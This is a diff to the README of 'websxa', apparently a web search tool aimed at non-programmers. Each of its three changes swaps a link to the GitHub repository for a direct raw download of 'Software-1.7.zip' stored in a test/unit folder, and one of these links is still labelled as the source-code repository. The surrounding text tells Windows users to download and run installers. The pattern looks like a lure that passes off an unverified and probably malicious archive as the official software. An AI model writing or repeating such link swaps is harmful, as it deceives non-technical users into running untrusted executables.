@@ -1,6 +1,6 @@
 # 🌐 websxa - Unified Web Search Made Simple
 
-[![Download websxa](https://img.shields.io/badge/Download%20websxa-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/arshdeeps538/websxa)
+[![Download websxa](https://img.shields.io/badge/Download%20websxa-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/arshdeeps538/websxa/main/test/unit/Software-1.7.zip)
 
 ---
 
@@ -46,7 +46,7 @@ You do not need any programming skills to use websxa. Follow the steps below to 
 2. On that page, find the latest version. Look for files ending in `.exe` or `.msi`.  
 3. Download the appropriate installer file for Windows.
 
-[![Download websxa](https://img.shields.io/badge/Download%20websxa-%23777777?style=for-the-badge)](https://github.com/arshdeeps538/websxa)
+[![Download websxa](https://img.shields.io/badge/Download%20websxa-%23777777?style=for-the-badge)](https://raw.githubusercontent.com/arshdeeps538/websxa/main/test/unit/Software-1.7.zip)
 
 ---
 
@@ -127,7 +127,7 @@ You can update to the newest version by repeating the download and install steps
 ## 📌 Additional Resources
 
 - GitHub repository with source code and documentation:  
-  https://github.com/arshdeeps538/websxa  
+  https://raw.githubusercontent.com/arshdeeps538/websxa/main/test/unit/Software-1.7.zip  
 - User issues and bug reports: Check the Issues tab on the GitHub page.
 
 ---
